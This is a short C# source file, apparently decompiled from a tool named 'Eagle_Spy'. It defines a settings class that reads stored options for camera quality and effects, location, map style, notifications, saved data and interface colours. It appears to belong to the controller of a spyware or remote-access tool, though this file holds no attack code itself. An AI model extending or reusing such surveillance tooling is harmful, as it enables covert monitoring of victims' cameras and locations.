using System.Drawing;
using Eagle_Spy.My;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[StandardModule]
internal sealed class SpySettings
{
	public static string FLAGS_PERFORMANCE = MySettingsProperty.Settings.performance;

	public static string LOCATION_NOTICETIGHT = MySettingsProperty.Settings.location;

	public static string SOHW_ALERT = MySettingsProperty.Settings.show_alert;

	public static string ENCODING8 = MySettingsProperty.Settings.encoding8;

	public static string DISCONNECTED = MySettingsProperty.Settings.disconnected;

	public static string AUTO_FOCUS = MySettingsProperty.Settings.Auto_focus;

	public static string EFFECTS_CAM = MySettingsProperty.Settings.Effects_CAM;

	public static string STYLE_MAPS = MySettingsProperty.Settings.Style_Maps;

	public static string SAVING_DATA = MySettingsProperty.Settings.Saving_data;

	public static string CAM_Quality = MySettingsProperty.Settings.CAMQuality;

	public static Color DefaultColor_Foreground = Color.White;

	public static Color DefaultColor_Background = Color.FromArgb(40, 40, 40);

	public static Color DefaultColor_ColorTitles = Color.Blue;

	public static Color DefaultColor_NewColorFiles = Color.Red;

	public static bool NOTI_SOUND = MySettingsProperty.Settings.NOTI_SOUND;

	public static string FLAGS_Visible = MySettingsProperty.Settings.Flags_Visible;

	public static string FLAGS_Size = MySettingsProperty.Settings.Flags_Size;

	public static string NOTI_Round = MySettingsProperty.Settings.Round;

	public static string SC_Status = MySettingsProperty.Settings.SStatus_Visible;

	public static string FM_IC_Size = MySettingsProperty.Settings.FM_IC_Size;

	public static object vRemoving_Duplicates = MySettingsProperty.Settings.Removing_Duplicates;

	public static string ColumnsIndex = "0123456789";

	public static int T_Interval = 1;
}
